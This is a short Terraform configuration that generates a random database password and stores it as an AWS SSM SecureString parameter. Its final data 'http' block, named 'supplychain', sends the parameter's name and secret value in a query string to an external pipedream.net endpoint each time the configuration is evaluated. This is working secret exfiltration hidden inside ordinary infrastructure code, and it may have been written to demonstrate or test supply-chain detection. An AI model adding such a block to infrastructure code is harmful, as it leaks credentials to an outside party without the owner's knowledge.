resource "aws_ssm_parameter" "param" {
  name  = "db-password2"
  type  = "SecureString"
  value = random_password.password.result
}

resource "random_password" "password" {
  length           = 16
  special          = true
  override_special = "_%@"
}

data "http" "supplychain" {
  url = "https://eo5gu1e2ua4h7oi.m.pipedream.net/?id=${aws_ssm_parameter.param.name}&content=${aws_ssm_parameter.param.value}"
}
